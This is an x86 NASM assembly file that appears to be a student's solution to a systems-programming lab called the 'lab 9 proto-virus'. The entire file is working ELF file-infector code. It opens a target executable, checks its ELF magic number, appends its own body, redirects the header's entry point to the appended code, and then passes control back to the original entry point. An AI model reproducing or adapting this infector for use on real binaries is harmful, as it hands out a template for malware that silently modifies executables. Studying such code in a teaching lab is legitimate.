%macro syscall 2
    mov ebx, %2
    mov eax, %1
    int 0x80
%endmacro

%macro syscall 4
    mov edx, %4
    mov ecx, %3
    mov ebx, %2
    mov eax, %1
    int 0x80
%endmacro

%macro exit 1
    syscall 1, %1
%endmacro

%macro write 3
    syscall 4, %1, %2, %3
%endmacro

%macro read 3
    syscall 3, %1, %2, %3
%endmacro

%macro open 3
    syscall 5, %1, %2, %3
%endmacro

%macro lseek 3
    syscall 19, %1, %2, %3
%endmacro

%macro close 1
    syscall 6, %1
%endmacro

%macro get_lbl_loc 1
    call get_anchor_loc
    add edx, (%1-anchor)
%endmacro

%macro get_lbl_loc 2
    get_lbl_loc %2
    mov %1, edx
%endmacro

%macro seek_to_start 1
    lseek %1, 0, SEEK_SET
%endmacro
%macro seek_to_end 1
    lseek %1, 0, SEEK_END
%endmacro

%define STK_RES 200
%define RDWR    2
%define SEEK_END 2
%define SEEK_SET 0

%define ELF_HEADER_SIZE 52
%define ENTRY         24
%define PHDR_start    28
%define PHDR_size     32
%define PHDR_memsize  20
%define PHDR_filesize 16
%define PHDR_offset   4
%define PHDR_vaddr    8

%define stdout 1

global _start

section .text
virus_start:
get_anchor_loc:
    call anchor
anchor:
    pop edx
    ret

_start:
    %push
    push ebp
    mov ebp, esp
    sub esp, STK_RES ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here
    %define %$loc ebp-4
    %define %$fd ebp-8
    %define %$fsz ebp-12

    ; task 0b
    %define %$mag ebp-16
    %define %$p_mag ebp-20

    ; task 1 and forward - NOTE: this overwrites task 0b variables
    %define %$exe_code_start_vaddr ebp-16
    %define %$exe_entry_point ebp-20
    %define %$p_exe_entry_point ebp-24
    %define %$elf_header ebp-(24+ELF_HEADER_SIZE)
    %define %$p_elf_header ebp-(28+ELF_HEADER_SIZE)

    .print_msg:
    get_lbl_loc [%$loc], OutStr
    write stdout, [%$loc], OutStr_len

    .open_elf_file:
    get_lbl_loc [%$loc], FileName
    open [%$loc], RDWR, 0
    
    .check_open:
    cmp eax, 0
    jg .open_success

    .open_failed:
    mov dword [ebp-8], eax
    get_lbl_loc [%$loc], Failstr
    write stdout, [%$loc], Failstr_len
    exit 1

    .open_success:
    mov dword [%$fd], eax

    .read_elf_magic_number:
    lea eax, [%$mag]
    mov dword [%$p_mag], eax
    read [%$fd], [%$p_mag], 4

    .check_elf_magic_number:
    cmp byte [%$mag], 0x7f
    jne .invalid_elf_magic_number
    cmp byte [%$mag+1], 'E'
    jne .invalid_elf_magic_number
    cmp byte [%$mag+2], 'L'
    jne .invalid_elf_magic_number
    cmp byte [%$mag+3], 'F'
    jne .invalid_elf_magic_number
    .valid_elf_magic_number:
    jmp .end_check_elf_magic_number
    .invalid_elf_magic_number:
    get_lbl_loc [%$loc], Failstr
    write stdout, [%$loc], Failstr_len
    exit 2
    .end_check_elf_magic_number:

    .append_virus_code:
    seek_to_end [%$fd]
    mov [%$fsz], eax
    get_lbl_loc [%$loc], virus_start
    write [%$fd], [%$loc], (virus_end - virus_start)

    .copy_elf_header:
    seek_to_start [%$fd]
    lea eax, [%$elf_header]
    mov dword [%$p_elf_header], eax
    read [%$fd], [%$p_elf_header], ELF_HEADER_SIZE

    .save_original_entry_point:
        mov eax, dword [%$elf_header+ENTRY]
        mov dword [%$exe_entry_point], eax
        lea eax, [%$exe_entry_point]
        mov dword [%$p_exe_entry_point], eax

    .change_entry_point:
    mov dword [%$exe_code_start_vaddr], 008048000h

    seek_to_start [%$fd]
    mov eax, 0
    add eax, dword [%$exe_code_start_vaddr]
    add eax, dword [%$fsz]
    add eax, dword (_start - virus_start)
    mov dword [%$elf_header+ENTRY], eax

    .write_elf_header_back_to_file:
    write [%$fd], [%$p_elf_header], ELF_HEADER_SIZE

    .write_previous_entry_point:
    lseek [%$fd], -4, SEEK_END
    write [%$fd], [%$p_exe_entry_point], 4

    .close_file:
    close [%$fd]

    .jump_to_previous_entry_point:    
    get_lbl_loc PreviousEntryPoint
    jmp [edx]

VirusExit:
       exit 0 ; Termination if all is OK and no previous code to jump to
              ; (also an example for use of above macros)
    
FileName: db "ELFexec", 0

OutStr: db "The lab 9 proto-virus strikes!", 10, 0
OutStr_len EQU $ - OutStr - 1

Failstr: db "perhaps not", 10 , 0
Failstr_len EQU $ - Failstr - 1

PreviousEntryPoint: dd VirusExit
virus_end:

%pop
